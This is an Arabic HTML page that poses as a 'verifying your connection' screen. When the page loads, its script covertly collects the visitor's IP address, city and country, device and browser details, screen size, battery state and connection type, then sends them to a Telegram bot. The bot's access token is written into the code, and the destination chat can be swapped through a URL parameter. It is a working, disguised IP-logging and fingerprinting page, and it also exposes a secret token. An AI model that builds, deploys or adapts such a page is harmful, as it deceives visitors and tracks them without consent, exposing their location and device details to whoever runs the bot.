<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>جارٍ التحقق...</title>
  <style>
    body {
      background-color: #f4f4f4;
      font-family: 'Cairo', sans-serif;
      text-align: center;
      padding-top: 20%;
      color: #333;
    }
    .loading {
      font-size: 1.2em;
    }
  </style>
</head>
<body>
  <h2>📡 يتم التحقق من اتصالك...</h2>
  <div class="loading">يرجى الانتظار قليلاً...</div>

  <script>
    async function getIPInfo() {
      const res = await fetch("https://ipapi.co/json/");
      return await res.json();
    }

    async function getBatteryInfo() {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging ? "نعم" : "لا"
        };
      }
      return { level: "غير متاح", charging: "غير متاح" };
    }

    async function collectData() {
      const ip = await getIPInfo();
      const battery = await getBatteryInfo();
      const connection = navigator.connection || {};
      const time = new Date().toLocaleString('ar-YE');

      return {
        ip: ip.ip,
        country: ip.country_name,
        city: ip.city,
        region: ip.region,
        timezone: ip.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
        time: time,
        os: navigator.platform,
        browser: navigator.userAgent,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "مظلم" : "فاتح",
        battery: battery.level + "%",
        charging: battery.charging,
        connection: connection.effectiveType || "غير معروف"
      };
    }

    function formatMessage(data) {
      return `📡 دخول جديد إلى الموقع:

🧠 معلومات الزائر:
🔹 IP: ${data.ip}
🔹 الدولة: ${data.country}
🔹 المدينة: ${data.city}, ${data.region}
🔹 التوقيت المحلي: ${data.time}
🔹 المنطقة الزمنية: ${data.timezone}

🖥️ الجهاز والمتصفح:
🔸 نظام التشغيل: ${data.os}
🔸 المتصفح: ${data.browser}
🔸 اللغة: ${data.language}
🔸 دقة الشاشة: ${data.screen}
🔸 الوضع: ${data.theme}

🔋 البطارية:
🔸 الشحن: ${data.battery}
🔸 موصل بالكهرباء: ${data.charging}

📶 الاتصال:
🔸 نوع الاتصال: ${data.connection}

⚠️ البيانات أُرسلت من خلال الصفحة المخصصة للزوار الجدد.
------------------------`;
    }

    async function sendToTelegram(msg) {
      const chatId = new URLSearchParams(window.location.search).get("ref") || "7121448697"; // ← بدّله لو لزم الأمر
      const token = "8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4"; // ← توكن البوت الخاص بك

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg
        })
      });
    }

    (async () => {
      const data = await collectData();
      const msg = formatMessage(data);
      await sendToTelegram(msg);
    })();
  </script>
</body>
</html>